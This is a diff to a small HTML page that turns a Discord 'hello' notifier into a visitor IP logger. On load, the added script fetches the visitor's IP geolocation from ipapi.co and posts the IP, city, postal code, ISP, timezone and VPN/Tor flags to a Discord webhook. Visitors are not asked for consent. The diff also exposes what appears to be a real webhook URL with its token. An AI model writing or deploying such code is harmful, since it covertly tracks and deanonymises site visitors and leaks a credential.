@@ -2,27 +2,51 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Hello Webhook</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>IP Info Sender</title>
 </head>
 <body>
   <h1>Welcome!</h1>
-  <p>A greeting was sent to the Discord webhook.</p>
+  <p>IP info is being sent to the webhook.</p>
 
   <script>
-    // 👇 Replace this with your actual Discord webhook URL
+    // ⚠️ Replace this with your actual Discord webhook URL
     const webhookUrl = "https://discord.com/api/webhooks/1432841888997834877/kGY6LdHzo7JliM6Kvw718EW9x2qlG6OojBb2CQc7Kov9G0Vqkn8De2mYqUgb1bRa7Ytv";
 
-    // Send a simple message when the site is opened
-    fetch(webhookUrl, {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({
-        content: "👋 Hello! Someone just entered the site."
-      })
-    })
-    .then(res => console.log("Sent hello to webhook:", res.status))
-    .catch(err => console.error("Failed to send webhook:", err));
+    async function sendIPInfo() {
+      try {
+        // Fetch the visitor's IP info
+        const response = await fetch("https://ipapi.co/json/");
+        const data = await response.json();
+
+        // Prepare the message content
+        const message = `
+            👤 **Visitor Info**
+            IP Address: ${data.ip}
+            City: ${data.city}
+            Region: ${data.region}
+            Country: ${data.country_name}
+            Postal Code: ${data.postal}
+            ISP: ${data.org}
+            Timezone: ${data.timezone}
+            VPN Detected: ${data.is_vpn}
+            Proxy Detected: ${data.is_proxy}
+            Tor Detected: ${data.is_tor}
+        `;
+
+        // Send to Discord webhook
+        await fetch(webhookUrl, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ content: message })
+        });
+
+      } catch (error) {
+        console.error("Failed to send IP info to webhook:", error);
+      }
+    }
+
+    sendIPInfo();
   </script>
 </body>
 </html>
